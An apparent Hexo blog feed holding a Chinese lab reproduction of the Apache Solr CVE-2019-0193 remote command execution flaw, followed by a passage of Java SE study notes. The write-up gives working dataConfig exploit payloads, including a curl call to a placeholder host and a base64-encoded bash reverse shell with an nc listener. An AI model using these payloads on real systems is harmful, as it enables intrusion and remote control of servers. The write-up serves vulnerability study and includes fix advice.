<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>困困</title>
  
  <subtitle>一只忧伤的小菜鸡</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-04-24T09:16:25.854Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>大白菜</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>二CVE-2019-0193：Apache Solr远程命令执行漏洞复现</title>
    <link href="http://example.com/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-04-24T07:08:18.000Z</published>
    <updated>2021-04-24T09:16:25.854Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0X00-漏洞概述"><a href="#0X00-漏洞概述" class="headerlink" title="0X00 漏洞概述"></a>0X00 漏洞概述</h1><p>​    2019年8月1日，Apache Solr官方发布了CVE-2019-0193漏洞预警，漏洞危害评级为严重。</p><p>​    此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求dataConfig参数来设置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。</p><h1 id="0X01-影响版本、利用条件"><a href="#0X01-影响版本、利用条件" class="headerlink" title="0X01 影响版本、利用条件"></a>0X01 影响版本、利用条件</h1><p>Apache solr &lt; 8.2.0</p><p>利用条件：</p><p>​    1.Apache Solr的DataImportHandler启用了模块DataImportHandler(默认情况下该模块不会被启用)</p><p>​    2.Solr Admin UI未开启鉴权认证。（默认情况下打开web界面无需任何认证）</p><h1 id="0X02-环境搭建"><a href="#0X02-环境搭建" class="headerlink" title="0X02 环境搭建"></a>0X02 环境搭建</h1><ul><li>使用kali2020，装有docker的虚拟机</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;archive&#x2F;master.zip -O vulhub-master.zip</span><br><span class="line"></span><br><span class="line">unzip vulhub-master.zip</span><br></pre></td></tr></table></figure><ul><li>进入进入漏洞目录使用docker-compose启动漏洞环境</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master&#x2F;solr&#x2F;CVE-2019-0193</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%AE%89%E8%A3%85%E5%9B%BE2.png"></p><ul><li>在输入命令创建test核心</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose exec solr bash bin&#x2F;solr create_core -c test -d example&#x2F;example-DIH&#x2F;solr&#x2F;db</span><br></pre></td></tr></table></figure><p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%AE%89%E8%A3%85%E5%9B%BE3.png"></p><ul><li>浏览器访问 http://靶机ip:8983，出现以下页面安装成功</li></ul><p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/anz%E5%9B%BE4.png"></p><h1 id="0X03-漏洞分析"><a href="#0X03-漏洞分析" class="headerlink" title="0X03 漏洞分析"></a>0X03 漏洞分析</h1><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><h3 id="Dataimport"><a href="#Dataimport" class="headerlink" title="Dataimport"></a>Dataimport</h3><p>用于导入自定义数据，dataconfig需要满足一定语法，参考</p><ul><li>[<a href>https://lucene.apache.org/solr/guide/6_6/uploading-structured-data-store-data-with-the-data-import-handler.html</a></li><li><a href="https://cwiki.apache.org/confluence/display/solr/DataImportHandler">https://cwiki.apache.org/confluence/display/solr/DataImportHandler</a></li></ul><p>ScriptTransformer可以编写自定义脚本，例如Javascript、JRuby、Jython、Groovy和BeanShell</p><p>​    ScriptTransformer容许用脚本语言如Javascript、JRuby、Jython、Groovy和BeanShell转换，函数应当以行（类型为Map&lt;String,Object&gt;）为参数，可以修改字段。</p><p>​    脚本应当写在数据仓库配置文件顶级的script元素内，而转换器属性值为script:函数名。（<strong>换言之可以自己编写脚本，不过要加上<code>&lt;script&gt; &lt;/script&gt;</code> 元素标志头</strong>）</p><p>​    要写脚本必须满足以下条件：”脚本内容”写在数据库配置文件中的<code>&lt;script&gt;脚本内容&lt;/script&gt;</code>标签之内，并且每个函数都必须接受一个名为<code>row</code>的变量，该变量的数据类型为 <code>Map&lt;String,Object&gt;</code>(键名-键值 映射)，因为是Map类型的变量，所以它可以使用<code>get()</code>,<code>put()</code>,<code>remove()</code>,<code>clear()</code>等方法操作元素。</p><p>​    所以通过脚本可以实现各种操作：修改已存在的字段的值、添加新字段等。每个函数的返回值都返回的是”对象”。</p><p>​    该脚本将插入DIH配置文件中（脚本内容 在DIH配置文件中的第一行开始），并为每一个”行”(row)调用一次脚本，有多少”行”(row)就调用多少次脚本。</p><p>例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;dataconfig&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 函数定义：  该脚本的作用是，获取<span class="string">&quot;华氏温度&quot;</span>（键名为temp_f）数值，计算出对应的<span class="string">&quot;摄氏温度&quot;</span>（键名为temp_c ）的值如<span class="number">99</span> ，插入键值对   <span class="string">&#x27;temp_c&#x27;</span>,<span class="number">99</span> 到这个名为row的<span class="built_in">Map</span>对象，retrun该对象  --&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 函数定义：生成一个新的row的脚本 它的作用是获取到华氏温度temp_f  根据该数值计算出 摄氏温度temp_c 并生成一个新row --&gt;</span><br><span class="line"></span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f2c</span>(<span class="params">row</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> tempf, tempc;</span><br><span class="line">      tempf = row.get(<span class="string">&#x27;temp_f&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (tempf != <span class="literal">null</span>) &#123;</span><br><span class="line">        tempc = (tempf - <span class="number">32.0</span>)*<span class="number">5.0</span>/<span class="number">9.0</span>;</span><br><span class="line">        row.put(<span class="string">&#x27;temp_c&#x27;</span>, temp_c);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> row;</span><br><span class="line">    &#125;</span><br><span class="line">    ]]&gt;</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">  &lt;<span class="built_in">document</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 函数调用：实体entity 中的属性transformer的值 为 函数名称（字符串 f2c ）,这样从外部数据源取到一条row，就会调用一次上面脚本中定义的名为f2c函数.  有多少条数据就调用多少次脚本中的函数 --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;entity name=<span class="string">&quot;e1&quot;</span> pk=<span class="string">&quot;id&quot;</span> transformer=<span class="string">&quot;script:f2c&quot;</span> query=<span class="string">&quot;select * from X&quot;</span>&gt;</span><br><span class="line">      ....</span><br><span class="line">    &lt;/entity&gt;</span><br><span class="line">  &lt;/<span class="built_in">document</span>&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure><h3 id="Nashorn引擎"><a href="#Nashorn引擎" class="headerlink" title="Nashorn引擎"></a>Nashorn引擎</h3><p>解析js脚本，可以通过Java.typeAPI在JavaScript中引用，就像Java的import一样（<strong>将文件包含在内</strong>）例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> MyJavaClass = Java.type(<span class="string">&#x27;my.package.MyJavaClass&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> result = MyJavaClass.sayHello(<span class="string">&quot;Nashorn&quot;</span>);</span><br><span class="line">print(result);</span><br></pre></td></tr></table></figure><h2 id="详细分析在以下文章"><a href="#详细分析在以下文章" class="headerlink" title="详细分析在以下文章"></a>详细分析在以下文章</h2><ul><li><a href="https://xz.aliyun.com/t/5965">https://xz.aliyun.com/t/5965</a></li></ul><h1 id="0X04-PoC"><a href="#0X04-PoC" class="headerlink" title="0X04 PoC"></a>0X04 PoC</h1><ul><li>进入DIH admin界面</li></ul><p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/DIHadmin%E7%95%8C%E9%9D%A2.png"></p><p>构造PoC的注意点1：<code>debug=true</code></p><p>​    如图，DataImportHandler模块的DIH admin界面中有一个debug选项(本来是为了方便对”DIH配置”进行调试或开发)，勾选<code>Debug</code>，点击Execute，看到在HtTP请求中是<code>debug=true</code>，在PoC中必须带上它（为了回显结果）</p><p>构造PoC的注意点2：<strong>dataConfig信息</strong></p><p>​    注意：数据配置(dataconfig)中实体(entity)、字段(field)标签中有哪些属性取决于用了哪个处理器(processor)、哪个转换器(transformer)</p><p>​    dataConfig信息中的关键点（1）：这里我使用的数据源的类型是URLDataSource(理论上其他数据源的类型都可以)</p><p>​    dataConfig信息中的关键点（2）：既然有（1），所以<code>&lt;document&gt;</code>中的 <code>&lt;entity&gt;</code>实体标签里说明了该实体的属性。</p><ul><li><code>&lt;entity&gt;</code>实体的属性<ul><li>属性name 必填 用于标识实体的唯一名称</li><li>属性processor可选项 默认值为<code>SqlEntityProcessor</code>，所以当数据源不是RDBMS时必须填写该项。对于<code>URLDataSource</code>类型的数据源而言，它的值必须为“XPathEntityProcessor”(根据官方说明只能使用XPathEntityProcessor对‘URL的HTTP响应“做处理)；</li><li>属性transformer可选项 填写格式为<code>transformer=&quot;script:&lt;function-name&gt;&quot;</code> 指定了转换数据时具体的transformer(转换器)需要执行的脚本函数的名称(即字符串“poc“)；</li><li>属性forEach 必填 值为Xpath表达式 用于“划分“记录。如果有多种类型的记录就用<code>|</code>符号把这些表达式分隔开；</li><li>属性url的值用于调用REST API的URL(可以模板化)</li></ul></li></ul><p>​    dataConfig信息中的关键点（3）：<code>&lt;dataConfig&gt;</code>中的<code>&lt;script&gt;</code>标签中，写了名为”poc”的脚本函数的具体实现。</p><p><strong>PoC：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type=<span class="string">&quot;URLDataSource&quot;</span>/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">          <span class="function"><span class="keyword">function</span> <span class="title">poc</span>(<span class="params"></span>)</span>&#123; java.lang.Runtime.getRuntime().exec(<span class="string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>); <span class="comment">//弹出计算器 &lt;script&gt;脚本内容&lt;/script&gt;</span></span><br><span class="line">          &#125;</span><br><span class="line">  ]]&gt;&lt;/script&gt;  </span><br><span class="line">  &lt;<span class="built_in">document</span>&gt;</span><br><span class="line">    &lt;entity name=<span class="string">&quot;stackoverflow&quot;</span></span><br><span class="line">            url=<span class="string">&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span></span><br><span class="line">            processor=<span class="string">&quot;XPathEntityProcessor&quot;</span></span><br><span class="line">            forEach=<span class="string">&quot;/feed&quot;</span></span><br><span class="line">            transformer=<span class="string">&quot;script:poc&quot;</span> /&gt;</span><br><span class="line">  &lt;/<span class="built_in">document</span>&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure><p>同一类型PoC：替换<code>&lt;script&gt;&lt;/script&gt;</code>内容即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;&lt;![CDATA[</span><br><span class="line">          <span class="function"><span class="keyword">function</span> <span class="title">poc</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line"><span class="keyword">new</span> java.lang.ProcessBuilder[<span class="string">&quot;(java.lang.String[])&quot;</span>]([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;curl your.net/demo&quot;</span>]).start()</span><br><span class="line">&#125;</span><br><span class="line">  ]]&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="0X05-漏洞利用"><a href="#0X05-漏洞利用" class="headerlink" title="0X05 漏洞利用"></a>0X05 漏洞利用</h1><ul><li>创建成功后，访问<code>http://ip:8983</code>访问Apache solr的管理页面，选择<code>test</code>核心</li></ul><p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%88%A9%E7%94%A81.png"></p><ul><li>编写EXP，反弹shell，命令进行base64编码</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp/<span class="number">192.168</span><span class="number">.171</span><span class="number">.133</span>/<span class="number">1234</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">编码后</span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3MS4xMzMvMTIzNCAwPiYx</span><br></pre></td></tr></table></figure><p>将PoC的内容修改，为EXP</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type=<span class="string">&quot;URLDataSource&quot;</span>/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">          <span class="function"><span class="keyword">function</span> <span class="title">poc</span>(<span class="params"></span>)</span>&#123; java.lang.Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3MS4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">  ]]&gt;&lt;/script&gt;</span><br><span class="line">  &lt;<span class="built_in">document</span>&gt;</span><br><span class="line">    &lt;entity name=<span class="string">&quot;stackoverflow&quot;</span></span><br><span class="line">            url=<span class="string">&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span></span><br><span class="line">            processor=<span class="string">&quot;XPathEntityProcessor&quot;</span></span><br><span class="line">            forEach=<span class="string">&quot;/feed&quot;</span></span><br><span class="line">            transformer=<span class="string">&quot;script:poc&quot;</span> /&gt;</span><br><span class="line">  &lt;/<span class="built_in">document</span>&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure><ul><li>攻击机开启nc监听1234端口</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure><p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%9B%91%E5%90%AC.png"></p><ul><li>开始攻击</li></ul><ol><li>访问Dataimport</li><li>勾选Debug</li><li>点击Debug Mode进入调试模式</li><li>使用EXP替换配置文件内容为(反弹shell到攻击机ip:端口)</li><li>执行</li></ol><p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%88%A9%E7%94%A82.png"></p><ul><li>成功反弹shell</li></ul><p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%BC%B9shell.png"></p><h1 id="0X06-修复建议"><a href="#0X06-修复建议" class="headerlink" title="0X06 修复建议"></a>0X06 修复建议</h1><p>​    Solr&gt;=8.2.0版安全。因为从Solr&gt;=8.2.0版开始，默认不可使用dataConfig参数，想使用此参数需要将Java System属性“enable.dih.dataConfigParam”设置为true。只有当Solr&gt;=8.2.0但是主动将Java System属性“enable.dih.dataConfigParam”设置为true，才存在漏洞。</p><h1 id="0X07-参考文章"><a href="#0X07-参考文章" class="headerlink" title="0X07 参考文章"></a>0X07 参考文章</h1><ul><li><p>[<a href="https://xz.aliyun.com/t/5965">https://xz.aliyun.com/t/5965</a></p></li><li><p><a href="https://blog.csdn.net/maxvchay/article/details/107017329">https://blog.csdn.net/maxvchay/article/details/107017329</a></p></li><li><p><a href="https://www.bilibili.com/read/cv9964152/">https://www.bilibili.com/read/cv9964152/</a></p></li><li><p><a href="https://xz.aliyun.com/t/5941">https://xz.aliyun.com/t/5941</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0X00-漏洞概述&quot;&gt;&lt;a href=&quot;#0X00-漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;0X00 漏洞概述&quot;&gt;&lt;/a&gt;0X00 漏洞概述&lt;/h1&gt;&lt;p&gt;​    2019年8月1日，Apache Solr官方发布了CVE-2019-01</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Java 0java SE 大纲</title>
    <link href="http://example.com/2021/04/21/Java-0java-SE-%E5%A4%A7%E7%BA%B2/"/>
    <id>http://example.com/2021/04/21/Java-0java-SE-%E5%A4%A7%E7%BA%B2/</id>
    <published>2021-04-21T12:33:41.000Z</published>
    <updated>2021-04-22T03:11:46.938Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一部分：基础知识"><a href="#第一部分：基础知识" class="headerlink" title="第一部分：基础知识"></a>第一部分：基础知识</h1><h1 id="第二部分-面向对象"><a href="#第二部分-面向对象" class="headerlink" title="第二部分:面向对象"></a>第二部分:面向对象</h1><h2 id="1-封装"><a href="#1-封装" class="headerlink" title="1.封装"></a>1.封装</h2><p>类</p><p>​    对一类事物抽象所得到的一个概念</p><p>对象</p><p>​    一个具体的事物构造函数</p><p>构造函数</p><ul><li>不能有返回值</li><li>方法名与类名相同</li><li>可以有多个</li><li>默认生成无参无方法体无返回值的构造函数，自己一旦定义,编译器将不再生成默认的构造函数生成一个类对象是能且只能调用其中的一个构适函数</li></ul><p>static</p><ul><li>凡是static修饰的成员都是静态成员，<strong>静态成员都是属于类的</strong></li><li>非静态的可以访问静态的</li><li>静态的不可以访问非静态的</li><li>通过类名只能访问一个类中的<strong>非私有静态成员</strong></li><li>私有静态成员也不可以通过对象名访问</li></ul><p>*<strong>类的方法只有一个，所有对象共用一个方法</strong></p><p>this</p><ul><li><p>非静态方法畎认都含有一个this指针</p></li><li><p>this代表正在调用本方法的对象</p></li></ul><p>final</p><ul><li><p>修饰类</p><ul><li>该类不能被继承</li></ul></li><li><p>修饰方法</p><ul><li>该方法可以被继承但不能被重写</li></ul></li><li><p>修饰属性</p><ul><li>表示该属性能且只能被赋一次值，赋值方式有两种，并且只能选择其中的一种来赋值<ul><li>1.定义的同时显示的初始化</li><li>2.构适函数中初始化</li></ul></li></ul></li><li><p>还可以修饰局部变量（用得少）</p></li></ul><h2 id="2-继承"><a href="#2-继承" class="headerlink" title="2.继承"></a>2.继承</h2><p>定义</p><p>​    子类继承了父类的成员</p><p>注意的问题：</p><p>​    非私有成员才可以被子类继承</p><p>​    重写：</p><p>​        重写方法必须和被重写方法具有相同的方法名称、参数列表、返回值类型</p><p>​        重写方法的访问权限不能小手被重写方法</p><h2 id="3-多态"><a href="#3-多态" class="headerlink" title="3.多态"></a>3.多态</h2><p>定义:</p><p>​    同一代码可以随上下文的不同而执行不同的操作，俗称多态</p><p>即：</p><p>​    一个父类的引用它既可以指向父类对象也可以指向子类对象</p><p>​    它可以根据当前时刻指向的不同，自动调用不向对象的方法</p><p>注意事项：</p><p>​    通过父类的引用只能访问子类从父类继承过来的成员</p><p>​    只有在父类的引用本身指向的就是一个子类对象时，我们才可以把父类的引用强制转化为子类的引用</p><h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><h3 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h3><p>一个抽象类通常都含有抽象方法</p><p>只重写了抽象类<strong>部分</strong>抽象方法的类也必须的被标记为abstract</p><p>不可以定义抽象类对象,但是抽象类可以卖现多态</p><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>接口中的方法都是<strong>public abstract</strong></p><p>不可以定义接口对象,但接口却可以实现多态</p><p>重写接口方法时public不能省</p><p>举例：</p><p>​    线程的创建</p><p>​    事件的处理</p><p>​    容器的组织方式</p><p>​    serializable接口</p><h1 id="第三部分：高级部分"><a href="#第三部分：高级部分" class="headerlink" title="第三部分：高级部分"></a>第三部分：高级部分</h1><h2 id="1-异常"><a href="#1-异常" class="headerlink" title="1.异常"></a>1.异常</h2><p>定义</p><p>​    运行时的错误</p><p>分类<br>    无法处理的错误</p><p>​    可以处理的异常</p><p>​    必须处理的异常</p><p>​            是Exception子类但不是Runt imeException的子类</p><p>​    可处理可不处理的异常</p><p>​            是RuntimeException的子类</p><p>注意问题：</p><p>​    <code>finally&#123;......&#125;</code>一定会执行</p><p>​    先捕获子类异常,在捕获父类异常,顺序不可颠倒</p><p>​    重写方法抛出异常的范围不能大于被重写方法抛出异常的范围</p><p>​    假设f方法抛出了A异常，则f方法有两种方式处理A异常</p><ol><li><code>throws A</code></li><li><code>try &#123;......&#125;catch() &#123;......&#125;</code></li></ol><h2 id="2-线程"><a href="#2-线程" class="headerlink" title="2.线程"></a>2.线程</h2><p>定义:</p><p>​    一个程序运行时的不同执行路径</p><p>创建线程的方式：</p><p>​    继承Thread类</p><p>​    实现Runnable接口（经常使用这个方法创建线程）</p><p>线程的同步</p><p>​    多个线程操作同一资源，并且要求这些操作中的若干个操作不能被中断,这时就需要考虑线程同步的问题</p><p>​    线程同步是通过<code>synchronized</code>来实现</p><p>​    <code>synchronized</code>可以修饰两种：</p><p>​        代码块</p><p>​        方法(默认锁定的是this)</p><p>​    示例：</p><p>​        买票</p><p>线程的通信</p><p>​    有时多个线程只有彼此相互协作才可以完成某个功能，这是就需要线程的通信</p><p>​    实现方式:</p><p>​        wai 和 notify / notifyA()</p><p>​    示例：</p><p>​        生产和消费</p><h2 id="3-包"><a href="#3-包" class="headerlink" title="3.包"></a>3.包</h2><p>包的生产与运行:</p><p>​    <code>package</code>语句必须是第一条语句</p><p>​    类名是包名和类名的组合</p><p>​    只有在整个包的最上层目录才可以运行</p><p>同包，不同包的相互访问（参考文章）</p><p>jar包的生成与jar包的使用</p><p>​    普通jar包的生成</p><p>​        <code>jar -cvf 要生成的jar包的名字.jar *</code> </p><p>​    可运行jar包的生成:</p><p>​        <code>jar-cvfm 要生成的jar包的名字.jar 1.txt *</code></p><h2 id="4-GUI"><a href="#4-GUI" class="headerlink" title="4.GUI"></a>4.GUI</h2><p>容器和组件的关系:</p><p>​    容器是组件，但组件不一定是容器</p><p>常见的布局管理器:</p><p>BorderLayout – Frame</p><p>FlowLayout– Panel</p><p>GridLayout</p><p>事件模型:</p><p>​    必须要明白哪些操作是编译器自动完成的，哪些操作是程序员手动处理的</p><p>​    程序员只需要做两件事:</p><p>​        告诉事件源可以产生哪些事件</p><p>​        设计好可以处理这些事件的事件监听器</p><p>内部类:</p><p>​    在一个类内部定义的类叫内部类</p><p>​    内部类的方法可以访问外部类的所有成员</p><p>​    外部类的方法不可以直接访问内部类的任何成员</p><p>​    一定要明白<strong>产生内部类的原因</strong></p><p>​                如果一个类A要使用B类的所有成员，并且A类不需要被除B以外的其他类访问，则我们可以把A定义成B的内部类</p><p>​                因此几乎不存在直接生成内部类对象的问题</p><p>​                因此几乎不存在外部类需要访同内部类成员的问题</p><p>匿名类:</p><p>​    匿名类是内部类的一种极端表现形式</p><p>​    匿名类可以访向外部类的所有成员和包裹本匿名类方法中的final类型的局部变量</p><h2 id="5-IO"><a href="#5-IO" class="headerlink" title="5.IO"></a>5.IO</h2><p>定义:</p><p>​    如果一个类是用来完成程序和设备之间的数据传输，则这个类有一个特殊的称谓叫流</p><p>流和类的关系</p><p>​    流一定是类，但类不一定是流</p><p>分类: </p><p>​    输入流 输出流 </p><p>​    字节流 字符流</p><p>​    原始流 包裹流</p><p>常用流介绍</p><p><strong>四大基本抽象流</strong></p><p>​    InputStream     0utputStream</p><p>​    Reader               Writer</p><p>字节流和字符流的区别</p><p>​    字节流可以处理所有格式的文件</p><p>​    字符流只能处理文本格式的文件</p><h3 id="文件流"><a href="#文件流" class="headerlink" title="文件流"></a>文件流</h3><p>FileInputStream            File0utputStream</p><p>FileReader                      Filewriter</p><h3 id="缓冲流"><a href="#缓冲流" class="headerlink" title="缓冲流"></a>缓冲流</h3><p>BufferedlnputStream        Buffered0utputStream</p><p>BufferedReader                    Bufferedriter</p><p>缓冲流可以提高数据传输的速度</p><h3 id="转化流"><a href="#转化流" class="headerlink" title="转化流"></a>转化流</h3><p>OutputStreamWriter        lnputStreamReader</p><p>例子:</p><p>​    如何将键盘上的字符组成字符串字节赋给String对象</p><p>​    编程卖现把用户从键盘输入的字符保荐到一个string对象中</p><h3 id="数据流"><a href="#数据流" class="headerlink" title="数据流"></a>数据流</h3><p>DatalnputStream        Data0utputStream</p><p>数据流可以吧基本类型数据的二进制直接读入或写出</p><p>例子:</p><p>​    编程实现将long类型数据写入byte数组</p><p>​    然后再byte数组中把该数据读出</p><h3 id="Print流（不会抛出异常）"><a href="#Print流（不会抛出异常）" class="headerlink" title="Print流（不会抛出异常）"></a>Print流（不会抛出异常）</h3><p>PrintStream        PrintWriter</p><p>Print流可以把基本类型数据格式化后的字符串输出</p><p>例子:</p><p>​    编程实现把键盘输入的数据写入A文件，如果输入有误则把出错信息写入B文件</p><h3 id="object流"><a href="#object流" class="headerlink" title="object流"></a>object流</h3><p>0bjectInputStream        0bjectOutputStream</p><p>Object流可以把一个对象直接写入或读出</p><h2 id="5容器"><a href="#5容器" class="headerlink" title="5容器:"></a>5容器:</h2><p>定义:</p><p>​    如果一个类是专门用来存放其他类对象的，则这个类有另外一个特殊的词叫做容器</p><p>容器和类的关系:</p><p>​    容器一定是类,但类不一定容器</p><h3 id="Collection接口"><a href="#Collection接口" class="headerlink" title="Collection接口"></a>Collection接口</h3><h4 